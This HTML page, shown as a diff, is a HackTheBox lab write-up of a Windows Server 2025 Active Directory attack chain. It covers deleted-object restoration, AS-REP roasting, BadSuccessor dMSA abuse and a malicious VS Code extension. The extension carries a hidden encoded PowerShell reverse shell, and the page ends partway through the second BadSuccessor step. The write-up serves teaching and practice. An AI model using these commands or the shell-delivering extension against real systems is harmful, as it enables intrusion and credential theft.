@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description"
+    content="HTB Checkpoint Writeup - Windows Server 2025 Active Directory chain: deleted object restoration, BadSuccessor dMSA abuse (x2), malicious VS Code extension supply chain, VM memory forensics with VMkatz, and Administrator access.">
+  <link rel="canonical" href="https://abdelaaziz0.github.io/writeups/checkpoint.html">
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://abdelaaziz0.github.io/writeups/checkpoint.html">
+  <meta property="og:title" content="Checkpoint - HTB Writeup">
+  <meta property="og:description"
+    content="HTB Checkpoint Writeup - Windows Server 2025 Active Directory chain: deleted object restoration, BadSuccessor dMSA abuse (x2), malicious VS Code extension supply chain, VM memory forensics with VMkatz, and Administrator access.">
+  <meta property="og:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Checkpoint - HTB Writeup">
+  <meta name="twitter:description"
+    content="HTB Checkpoint Writeup - Windows Server 2025 Active Directory chain: deleted object restoration, BadSuccessor dMSA abuse (x2), malicious VS Code extension supply chain, VM memory forensics with VMkatz, and Administrator access.">
+  <meta name="twitter:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
+  <title>Checkpoint - HTB Writeup</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link
+    href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=DM+Serif+Display&family=DM+Sans:wght@300;400;500&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/writeup.css">
+</head>
+
+<body>
+
+  <header>
+    <nav>
+      <a class="nav-logo" href="../index.html">AB_</a>
+      <ul class="nav-links">
+        <li><a href="../blog.html">Blog</a></li>
+        <li><a href="../writeups.html">Writeups</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+        <li><a href="../cv.pdf" download>CV</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <div class="wrapper">
+
+    <div class="back-row">
+      <a class="back-link" href="../writeups.html">← Retour aux analyses</a>
+    </div>
+
+    <div class="hero">
+      <span class="hero-category">HackTheBox - Active Directory</span>
+      <h1>Checkpoint</h1>
+      <p class="hero-sub">
+        A Windows Server 2025 Domain Controller chain starting from a single domain credential.
+        The path runs through deleted AD object restoration, password reuse, or a first BadSuccessor
+        (dMSA abuse, Windows Server 2025) run as an alternative to those recovered credentials.
+        Write access to the DevDrop extension share then enables a VS Code supply chain attack that
+        delivers a shell as a developer. A second BadSuccessor provides the required lateral movement to
+        svc_deploy, whose backup access membership leads to a VM memory forensics step that extracts
+        the Administrator hash from a nightly backup snapshot.
+      </p>
+      <div class="hero-meta">
+        <span class="tag tag-date">2026-06-17</span>
+        <span class="tag tag-cat">Active Directory</span>
+        <span class="tag tag-cat">Windows</span>
+        <span class="tag tag-cat">BadSuccessor</span>
+        <span class="tag tag-hard">Hard</span>
+        <span class="tag tag-win">Windows Domain Controller</span>
+      </div>
+      <div class="stats-row">
+        <div class="stat"><span class="stat-val">2</span><span class="stat-label">BadSuccessor</span></div>
+        <div class="stat"><span class="stat-val">1</span><span class="stat-label">DC</span></div>
+        <div class="stat"><span class="stat-val">2025</span><span class="stat-label">Server</span></div>
+        <div class="stat"><span class="stat-val">VMkatz</span><span class="stat-label">Forensics</span></div>
+      </div>
+    </div>
+
+    <div class="toc">
+      <div class="toc-title">Table of Contents</div>
+      <ol>
+        <li><a href="#s1">Environment &amp; Scope</a></li>
+        <li><a href="#s2">Initial Enumeration</a></li>
+        <li><a href="#s3">AD Enumeration with BloodyAD</a></li>
+        <li><a href="#s4">Deleted Object Restoration</a></li>
+        <li><a href="#s5">BadSuccessor #1: Mark Davies</a></li>
+        <li><a href="#s6">VS Code Extension Supply Chain</a></li>
+        <li><a href="#s7">User Shell &amp; User Flag</a></li>
+        <li><a href="#s8">BadSuccessor #2: svc_deploy</a></li>
+        <li><a href="#s9">WinRM as svc_deploy &amp; VMBackups</a></li>
+        <li><a href="#s10">VM Memory Forensics with VMkatz</a></li>
+        <li><a href="#s11">Root Flag</a></li>
+        <li><a href="#s12">Full Attack Chain</a></li>
+        <li><a href="#s13">Key Takeaways</a></li>
+      </ol>
+    </div>
+
+    <section id="s1">
+      <span class="section-number">01 - Environment &amp; Scope</span>
+      <h2>Environment &amp; Scope</h2>
+
+      <p>Checkpoint is a single Windows Server 2025 Domain Controller. The provided credential
+        <code>alex.turner:Checkpoint2024!</code> gives standard domain user access with no admin shares,
+        no WinRM, and no Kerberoastable SPNs. The attack surface is LDAP enumeration,
+        a mismanaged SMB extension share, a deleted AD object, and the Windows Server 2025-specific
+        BadSuccessor privilege escalation.
+      </p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Host</th>
+              <th>IP</th>
+              <th>Role</th>
+              <th>Notes</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Exegol</td>
+              <td><code>10.10.14.x</code></td>
+              <td>Attack box</td>
+              <td>VPN interface <code>tun0</code></td>
+            </tr>
+            <tr>
+              <td>DC01</td>
+              <td><code>10.129.25.58</code></td>
+              <td>Domain Controller</td>
+              <td><code>checkpoint.htb</code>, Windows Server 2025 Build 26100</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Account</th>
+              <th>Secret</th>
+              <th>Type</th>
+              <th>How Obtained</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>alex.turner</code></td>
+              <td><code>Checkpoint2024!</code></td>
+              <td>Plaintext</td>
+              <td>Given credential</td>
+            </tr>
+            <tr>
+              <td><code>mark.davies</code></td>
+              <td><code>Checkpoint2024!</code></td>
+              <td>Plaintext</td>
+              <td>Password reuse after deleted object restoration</td>
+            </tr>
+            <tr>
+              <td><code>mark.davies</code></td>
+              <td><code>[redacted]</code></td>
+              <td>NT hash</td>
+              <td>BadSuccessor #1 via dMSA markdmsa3$</td>
+            </tr>
+            <tr>
+              <td><code>svc_deploy</code></td>
+              <td><code>[redacted]</code></td>
+              <td>NT hash</td>
+              <td>BadSuccessor #2 via dMSA svcdmsa$</td>
+            </tr>
+            <tr>
+              <td><code>Administrator</code></td>
+              <td><code>[redacted]</code></td>
+              <td>NT hash</td>
+              <td>VM memory forensics with VMkatz</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <section id="s2">
+      <span class="section-number">02 - Reconnaissance</span>
+      <h2>Initial Enumeration</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        Classic DC port layout. SMB signing is required, so relay is off the table. The DevDrop share
+        comment ("VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0")
+        is the first real signal: an extension delivery mechanism that becomes a code execution primitive
+        if write access can be obtained.
+      </div>
+
+      <pre><code>PORT    STATE SERVICE
+53/tcp  open  domain
+88/tcp  open  kerberos-sec
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+389/tcp open  ldap
+445/tcp open  microsoft-ds</code></pre>
+
+      <pre><code>nxc smb "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" --shares
+
+SMB  10.129.25.58  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB  10.129.25.58  445  DC01  [+] checkpoint.htb\alex.turner:Checkpoint2024!
+SMB  10.129.25.58  445  DC01  Share      Permissions  Remark
+SMB  10.129.25.58  445  DC01  -----      -----------  ------
+SMB  10.129.25.58  445  DC01  ADMIN$                  Remote Admin
+SMB  10.129.25.58  445  DC01  C$                      Default share
+SMB  10.129.25.58  445  DC01  DevDrop    READ         VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+SMB  10.129.25.58  445  DC01  IPC$       READ         Remote IPC
+SMB  10.129.25.58  445  DC01  NETLOGON   READ         Logon server share
+SMB  10.129.25.58  445  DC01  SYSVOL     READ         Logon server share
+SMB  10.129.25.58  445  DC01  VMBackups</code></pre>
+
+      <pre><code>nxc smb "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" --users
+
+SMB  10.129.25.58  445  DC01  alex.turner      2026-05-09 09:00:08
+SMB  10.129.25.58  445  DC01  mark.davies      2026-05-09 09:00:48
+SMB  10.129.25.58  445  DC01  ryan.brooks      2026-05-10 13:46:18
+SMB  10.129.25.58  445  DC01  svc_deploy       2026-05-09 09:01:19  Deployment service account
+SMB  10.129.25.58  445  DC01  james.harper     2026-05-09 09:02:53
+SMB  10.129.25.58  445  DC01  sarah.mitchell   2026-05-09 09:02:58
+...</code></pre>
+
+      <pre><code>nxc ldap "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" --groups
+
+LDAP  10.129.25.58  389  DC01  IT-Staff            3
+LDAP  10.129.25.58  389  DC01  Finance-Staff       2
+LDAP  10.129.25.58  389  DC01  HR-Staff            2
+LDAP  10.129.25.58  389  DC01  Engineering-Staff   4
+LDAP  10.129.25.58  389  DC01  VPN-Users           4
+LDAP  10.129.25.58  389  DC01  DevTeam             3
+LDAP  10.129.25.58  389  DC01  DnsAdmins           0
+LDAP  10.129.25.58  389  DC01  <span class="good">BackupAccess        1</span></code></pre>
+
+      <p><code>BackupAccess</code> has exactly one member. This group almost certainly controls the
+        VMBackups share. DevTeam has three members, making it the likely audience for the DevDrop
+        extension repository.</p>
+
+      <pre><code>GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt \
+  -usersfile users.txt -dc-ip "$TARGET" "$DOMAIN"/
+
+No AS-REP roastable accounts found.</code></pre>
+
+      <pre><code>GetUserSPNs.py "$DOMAIN/$ADUSER:$PASSWORD" -dc-ip "$TARGET" -request-user svc_deploy
+
+No entries found!</code></pre>
+
+      <p>Both ASREP roasting and Kerberoasting returned nothing. The path is through AD object abuse.
+        Switch to BloodyAD for deeper enumeration.</p>
+    </section>
+
+    <section id="s3">
+      <span class="section-number">03 - AD Enumeration</span>
+      <h2>AD Enumeration with BloodyAD</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        BloodHound-py failed. The Windows Server 2025 DC enforces LDAP signing, which breaks the
+        legacy collector's LDAPS fallback. BloodyAD's direct LDAP mode bypasses this restriction.
+      </div>
+
+      <pre><code>bloodhound.py --zip -c DCOnly -d checkpoint.htb -u alex.turner -k -no-pass \
+  -dc dc01.checkpoint.htb -ns "$TARGET" --dns-tcp
+
+INFO: Connecting to LDAP server: dc01.checkpoint.htb
+WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
+CRITICAL: Kerberos auth to LDAP failed, no authentication methods left
+CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements.</code></pre>
+
+      <p>LDAP signing on Windows Server 2025 rejects the ldap3 Kerberos bind that BloodHound-py uses,
+        and the LDAPS fallback hits a TLS reset on the IPv6 interface. BloodyAD queries LDAP directly
+        without that binding requirement.</p>
+
+      <pre><code>bloodyAD --host "$TARGET" -u "$ADUSER" -p "$PASSWORD" \
+  get object "Remote Management Users" --attr member
+
+distinguishedName: CN=Remote Management Users,CN=Builtin,DC=checkpoint,DC=htb
+<span class="good">member: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb</span></code></pre>
+
+      <pre><code>bloodyAD --host "$TARGET" -u "$ADUSER" -p "$PASSWORD" get writable
+
+distinguishedName: OU=Employees,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
+permission: WRITE
+
+<span class="good">distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb</span>
+<span class="good">permission: WRITE</span></code></pre>
+
+      <p>alex.turner has WRITE on the deleted <code>mark.davies</code> object and CREATE_CHILD on the
+        Employees OU. On the privilege escalation side, ryan.brooks holds GenericWrite on svc_deploy:</p>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  get object "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
+  --attr nTSecurityDescriptor --resolve-sd
+
+...
+nTSecurityDescriptor.ACL.9.Trustee: ryan.brooks
+<span class="good">nTSecurityDescriptor.ACL.9.Right: GENERIC_WRITE</span>
+...</code></pre>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  get object "DevTeam" --attr distinguishedName,member
+
+distinguishedName: CN=DevTeam,OU=Engineering,OU=Employees,DC=checkpoint,DC=htb
+member: CN=Brian Jenkins,...; CN=Michael Torres,...; <span class="good">CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb</span></code></pre>
+
+      <p>DevTeam includes ryan.brooks. Combined with the VS Code extension share description,
+        this confirms the delivery mechanism: if write access to DevDrop can be obtained,
+        a malicious extension will reach ryan.brooks' workstation.</p>
+    </section>
+
+    <section id="s4">
+      <span class="section-number">04 - Object Restoration</span>
+      <h2>Deleted Object Restoration</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        AD's Recycle Bin preserves most attributes of deleted objects, including group memberships
+        and ACL entries. alex.turner's WRITE on the deleted mark.davies object, combined with
+        CREATE_CHILD on the Employees OU, is enough to restore and re-enable the account without
+        knowing the original password.
+      </div>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  set restore --newParent "OU=Employees,DC=checkpoint,DC=htb" \
+  'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
+
+<span class="good">[+] CN=Mark Davies... has been restored under OU=Employees,DC=checkpoint,DC=htb</span></code></pre>
+
+      <pre><code>bloodyAD --host "$TARGET" -u "$ADUSER" -p "$PASSWORD" remove uac "mark.davies" -f ACCOUNTDISABLE</code></pre>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  get object "mark.davies" --attr distinguishedName,sAMAccountName,objectSid
+
+distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
+sAMAccountName: mark.davies
+<span class="good">objectSid: S-1-5-21-3129162710-3498938529-1807524340-1102</span></code></pre>
+
+      <p>A password change attempt fails. The account policy blocks it:</p>
+
+      <pre><code>bloodyAD --host "$TARGET" -u "$ADUSER" -p "$PASSWORD" set password "mark.davies" 'Checkpoint2026!'
+
+LDAPModifyException: unwillingToPerform for CN=Mark Davies,... — Reason: ERROR_DS_UNWILLING_TO_PERFORM
+[!] Failed to change password, the old password might be wrong or the account may not allow password changes</code></pre>
+
+      <p>Alternative: set <code>DONT_REQ_PREAUTH</code> to AS-REP roast the restored account.</p>
+
+      <pre><code>bloodyAD --host "$TARGET" -u "$ADUSER" -p "$PASSWORD" add uac "mark.davies" -f DONT_REQ_PREAUTH
+
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt \
+  -usersfile users.txt -dc-ip "$TARGET" "$DOMAIN"/
+
+$krb5asrep$18$mark.davies$CHECKPOINT.HTB$5f8a2704f20c52b30f489ec4$6060ad4358de2b4f11d040...</code></pre>
+
+      <div class="callout">
+        <span class="callout-label">Hash type 18: AES256-CTS-HMAC-SHA1-96</span>
+        The AS-REP came back as type 18 (AES256). hashcat mode 18200 targets type 23 (RC4-based AS-REP).
+        Attempting to crack type 18 directly against rockyou failed. Downgrading the account to RC4
+        by writing <code>msDS-SupportedEncryptionTypes = 4</code> forces the KDC to issue an
+        RC4-encrypted response.
+      </div>
+
+      <pre><code>bloodyAD --host "$TARGET" -u "$ADUSER" -p "$PASSWORD" \
+  set object "mark.davies" msDS-SupportedEncryptionTypes -v 4
+
+GetNPUsers.py -request -format hashcat -outputfile mark.rc4.asrep \
+  -usersfile users.txt -dc-ip "$TARGET" "$DOMAIN"/
+
+hashcat --hash-type 18200 --attack-mode 0 mark.rc4.asrep /usr/share/wordlists/rockyou.txt
+
+Status: Exhausted — password not found in wordlist.</code></pre>
+
+      <p>Hash cracking failed on both AES256 and RC4 variants. Testing the initial credential directly
+        against the restored account is the next step.</p>
+
+      <div class="callout">
+        <span class="callout-label">Password reuse</span>
+        <code>mark.davies:Checkpoint2024!</code> authenticates successfully. Same password as
+        alex.turner. mark.davies has READ and WRITE on DevDrop, unlike alex.turner who had only READ.
+      </div>
+
+      <pre><code>nxc smb "$TARGET" -d "$DOMAIN" -u "mark.davies" -p "$PASSWORD" --shares
+
+SMB  10.129.25.58  445  DC01  [+] checkpoint.htb\mark.davies:Checkpoint2024!
+SMB  10.129.25.58  445  DC01  <span class="good">DevDrop  READ,WRITE  VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0</span></code></pre>
+    </section>
+
+    <section id="s5">
+      <span class="section-number">05 - BadSuccessor #1</span>
+      <h2>BadSuccessor #1: Mark Davies</h2>
+
+      <div class="theory">
+        <span class="theory-label">BadSuccessor (CVE-2025-29652)</span>
+        <p>Windows Server 2025 introduced <strong>Delegated Managed Service Accounts (dMSA)</strong>,
+          a new AD object type designed to gradually replace gMSAs. The succession feature lets a dMSA
+          inherit the cryptographic keys of a previous account, providing seamless service continuity.
+        </p>
+        <p>BadSuccessor abuses this mechanism. An attacker with <code>CreateChild</code> on an OU can
+          create a dMSA and configure the succession chain to impersonate any target account. Four
+          attributes must be set:</p>
+        <ul>
+          <li>On the <strong>dMSA</strong>: <code>msDS-ManagedAccountPrecededByLink</code> = target account DN</li>
+          <li>On the <strong>dMSA</strong>: <code>msDS-DelegatedMSAState</code> = 2</li>
+          <li>On the <strong>target</strong>: <code>msDS-SupersededManagedAccountLink</code> = dMSA DN</li>
+          <li>On the <strong>target</strong>: <code>msDS-SupersededServiceAccountState</code> = 2</li>
+        </ul>
+        <p>With those attributes in place, <code>badS4U2self</code> uses the creator's TGT to perform
+          S4U2self toward the dMSA. The KDC treats the dMSA as a legitimate successor and includes the
+          target account's cryptographic keys in the TGS response, including its NT hash (RC4 key).
+        </p>
+        <div class="theory-diagram">Prerequisites for this instance
+          alex.turner → CreateChild on OU=Employees
+          alex.turner → WRITE on mark.davies
+
+          ① alex.turner creates markdmsa3$ in OU=Employees
+          └─ msDS-ManagedAccountPrecededByLink = CN=Mark Davies,...
+          └─ msDS-DelegatedMSAState = 2
+
+          ② alex.turner writes to mark.davies
+          └─ msDS-SupersededManagedAccountLink = CN=markdmsa3,...
+          └─ msDS-SupersededServiceAccountState = 2
+
+          ③ badS4U2self (TGT alex.turner) → krbtgt for markdmsa3$
+          └─ KDC returns mark.davies' keys in the TGS response
+
+          RC4 key = mark.davies NT hash</div>
+      </div>
+
+      <p>Password reuse already gives access to DevDrop. This BadSuccessor run on mark.davies is an
+        alternative path to the same result: alex.turner has both the CreateChild right on OU=Employees
+        and WRITE on mark.davies, the exact combination needed. The NT hash it produces is equivalent
+        to the plaintext credential.</p>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  add badSuccessor markdmsa3 \
+  -t "CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb" \
+  --ou "OU=Employees,DC=checkpoint,DC=htb"
+
+<span class="good">[+] Creating DMSA markdmsa3$ in OU=Employees,DC=checkpoint,DC=htb</span>
+<span class="good">[+] Impersonating: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb</span>
+attributeOrValueExists for CN=Mark Davies,... (Attr msDS-SupersededManagedAccountLink) Reason: ERROR_DS_SINGLE_VALUE_CONSTRAINT</code></pre>
+
+      <div class="callout">
+        <span class="callout-label">Tool error: attributeOrValueExists</span>
+        The dMSA was created with the correct <code>msDS-ManagedAccountPrecededByLink</code> and state,
+        but the reverse link on mark.davies failed with a single-value constraint error. The succession
+        attributes on the target must be set manually.
+      </div>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  set object "mark.davies" msDS-SupersededManagedAccountLink \
+  -v "CN=markdmsa3,OU=Employees,DC=checkpoint,DC=htb"
+
+bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  set object "mark.davies" msDS-SupersededServiceAccountState -v 2</code></pre>
+
+      <pre><code>getTGT.py "$DOMAIN/$ADUSER:$PASSWORD" -dc-ip "$TARGET"
+export KRB5CCNAME=alex.turner.ccache
+
+badS4U2self \
+  "kerberos+ccache://CHECKPOINT.HTB\\alex.turner:alex.turner.ccache@DC01.checkpoint.htb/?dc=$TARGET" \
+  "krbtgt/CHECKPOINT.HTB@CHECKPOINT.HTB" \
+  'markdmsa3$@CHECKPOINT.HTB' --dmsa
+
+[*] [S4U2self] Got valid TGS reply
+<span class="good">[+] Success!</span>
+dMSA current keys found in TGS:
+<span class="good">RC4: [redacted]</span></code></pre>
+
+      <pre><code>nxc smb "$TARGET" -d checkpoint.htb -u mark.davies -H [redacted] --shares
+
+SMB  10.129.25.58  445  DC01  <span class="good">[+] checkpoint.htb\mark.davies:[redacted]</span>
+SMB  10.129.25.58  445  DC01  <span class="good">DevDrop  READ,WRITE</span></code></pre>
+    </section>
+
+    <section id="s6">
+      <span class="section-number">06 - Extension Supply Chain</span>
+      <h2>VS Code Extension Supply Chain</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        DevDrop is an internal extension repository explicitly targeting VS Code 1.118.0. ryan.brooks
+        is in DevTeam and uses VS Code on this machine. A malicious <code>.vsix</code> with
+        <code>activationEvents: ["*"]</code> executes on startup with no user interaction beyond VS Code
+        launching.
+      </div>
+
+      <p>A VS Code extension package requires two files: <code>package.json</code> (manifest defining
+        the engine compatibility and activation trigger) and <code>extension.js</code> (the code that
+        runs on activation). The engine version <code>^1.118.0</code> matches what the share advertises,
+        ensuring the extension is picked up without a compatibility warning.</p>
+
+      <pre><code><strong>extension.js</strong>
+
+const cp = require("child_process");
+
+function activate(context) {
+  const ps = `
+    $client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});
+    $stream = $client.GetStream();
+    [byte[]]$bytes = 0..65535|%{0};
+    $sendbyte=([Text.Encoding]::ASCII).GetBytes('PS '+(pwd).Path+'> ');
+    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();
+    while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){
+      $data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+      $sendback=(iex $data 2>&1|Out-String);
+      $sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback+'PS '+(pwd).Path+'> ');
+      $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
+    }$client.Close()
+  `;
+  const enc = Buffer.from(ps,"utf16le").toString("base64");
+  cp.exec("powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand "+enc,
+    {windowsHide:true},()=>{});
+}
+function deactivate(){}
+module.exports={activate,deactivate};</code></pre>
+
+      <pre><code><strong>package.json</strong>
+
+{
+  "name": "checkpoint-shell",
+  "displayName": "Checkpoint Shell",
+  "version": "1.0.0",
+  "publisher": "checkpoint",
+  "engines": { "vscode": "^1.118.0" },
+  "main": "./extension.js",
+  "activationEvents": [ "*" ]
+}</code></pre>
+
+      <pre><code>vsce package --allow-missing-repository --allow-star-activation
+
+<span class="good"> DONE  Packaged: checkpoint-shell-1.0.0.vsix (4 files, 2.12 KB)</span></code></pre>
+
+      <pre><code>smbclient "//$TARGET/DevDrop" \
+  -U "checkpoint.htb/mark.davies%[redacted]" \
+  --pw-nt-hash \
+  -c "put shell-activate-vsix/checkpoint-shell-1.0.0.vsix checkpoint-shell-1.0.0.vsix"</code></pre>
+    </section>
+
+    <section id="s7">
+      <span class="section-number">07 - User Access</span>
+      <h2>User Shell &amp; User Flag</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        A netcat listener received the connection shortly after the upload. The shell context
+        is <code>ryan.brooks</code>, confirming the extension executed inside the developer's
+        VS Code session.
+      </div>
+
+      <pre><code>nc -lvnp "$LPORT"
+Ncat: Listening on 0.0.0.0:4444
+
+Ncat: Connection from 10.129.25.166.
+PS C:\Program Files\Microsoft VS Code> type c:/Users/ryan.brooks/Desktop/user.txt
+<span class="good">53d5ba993260bed599cf0b7ba4ac68e4</span></code></pre>
+
+      <div class="pwned-badge">
+        <div class="pwned-dot"></div>
+        User Flag Captured: Deleted Object Restore → Password Reuse → DevDrop WRITE → Malicious .vsix → ryan.brooks
+      </div>
+
+      <p>VMBackups is inaccessible from ryan.brooks' context. The <code>BackupAccess</code> group
+        controls that share and only <code>svc_deploy</code> is a member. The next step is obtaining
+        svc_deploy's credentials. ryan.brooks' GenericWrite on svc_deploy is the lever.</p>
+
+      <pre><code>PS C:\Shares\VMBackups> icacls C:\Shares\VMBackups
+Successfully processed 0 files; Failed processing 1 files</code></pre>
+    </section>
+
+    <section id="s8">
+      <span class="section-number">08 - BadSuccessor #2</span>
+      <h2>BadSuccessor #2: svc_deploy</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        alex.turner has CREATE_CHILD on OU=Employees, which is enough to create the dMSA. But alex.turner
+        has no write rights on svc_deploy's attributes. ryan.brooks holds GenericWrite on svc_deploy.
+        The PowerShell ADSI interface in the active reverse shell bridges the two accounts.
+      </div>
+
+      <h3>Step 1: Create the dMSA as alex.turner</h3>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  add badSuccessor svcdmsa \
+  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
+
+[+] Creating DMSA svcdmsa$ in OU=Employees,DC=checkpoint,DC=htb
+[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+AttributeError: 'list' object has no attribute 'encode'</code></pre>
+
+      <p>The dMSA was not created. The object DN encoding bug fires before the LDAP add. Updating
+        bloodyAD to a patched version (the fix passes <code>t[0]</code> instead of <code>t</code> for
+        single-value DN lists) and retrying:</p>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  add badSuccessor svcdmsa \
+  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
+
+<span class="good">[+] Creating DMSA svcdmsa$ in OU=Employees,DC=checkpoint,DC=htb</span>
+<span class="good">[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb</span>
+TypeError: Cannot mix str and non-str arguments</code></pre>
+
+      <div class="callout">
+        <span class="callout-label">Second tool bug: urlunparse type mismatch</span>
+        The updated version creates the dMSA correctly but raises a <code>TypeError</code> in
+        <code>urlunparse</code> when trying to write the succession link back to svc_deploy.
+        The dMSA object exists in AD, confirmed by the success lines. The succession attributes
+        on svc_deploy must still be set manually.
+      </div>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  get search --base "OU=Employees,DC=checkpoint,DC=htb" \
+  --filter "(sAMAccountName=svcdmsa$)" \
+  --attr distinguishedName,sAMAccountName,msDS-ManagedAccountPrecededByLink,msDS-DelegatedMSAState
+
+distinguishedName: CN=svcdmsa,OU=Employees,DC=checkpoint,DC=htb
+<span class="good">msDS-DelegatedMSAState: 2</span>
+<span class="good">msDS-ManagedAccountPrecededByLink: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb</span>
+sAMAccountName: svcdmsa$</code></pre>
+
+      <h3>Step 2: Write succession attributes on svc_deploy via ryan.brooks</h3>
+
+      <p>ryan.brooks' GenericWrite on svc_deploy allows writing arbitrary non-protected attributes.
+        The PowerShell ADSI interface in the reverse shell executes in that context:</p>
+
+      <pre><code>PS C:\Shares\VMBackups> $svc = [ADSI]"LDAP://CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
+$svc.PutEx(2,"msDS-SupersededManagedAccountLink",@("CN=svcdmsa,OU=Employees,DC=checkpoint,DC=htb"))
+$svc.Put("msDS-SupersededServiceAccountState",2)
+$svc.SetInfo()</code></pre>
+
+      <pre><code>bloodyAD --host "$TARGET" --dns "$TARGET" -d "$DOMAIN" -u "$ADUSER" -p "$PASSWORD" \
+  get object "svc_deploy" \
+  --attr msDS-SupersededManagedAccountLink,msDS-SupersededServiceAccountState
+
+<span class="good">msDS-SupersededManagedAccountLink: CN=svcdmsa,OU=Employees,DC=checkpoint,DC=htb</span>
+<span class="good">msDS-SupersededServiceAccountState: 2</span></code></pre>
+
+      <h3>Step 3: Run badS4U2self for svcdmsa$</h3>
+
+      <pre><code>badS4U2self -vv \
+  "kerberos+ccache://CHECKPOINT.HTB\\alex.turner:alex.turner.ccache@DC01.checkpoint.htb/?dc=$TARGET" \
+  "krbtgt/CHECKPOINT.HTB@CHECKPOINT.HTB" \
+  'svcdmsa$@CHECKPOINT.HTB' --dmsa
+
+[*] [S4U2self] Got valid TGS reply
+<span class="good">[+] Success!</span>
+
+dMSA current keys found in TGS:
+AES256: [redacted]
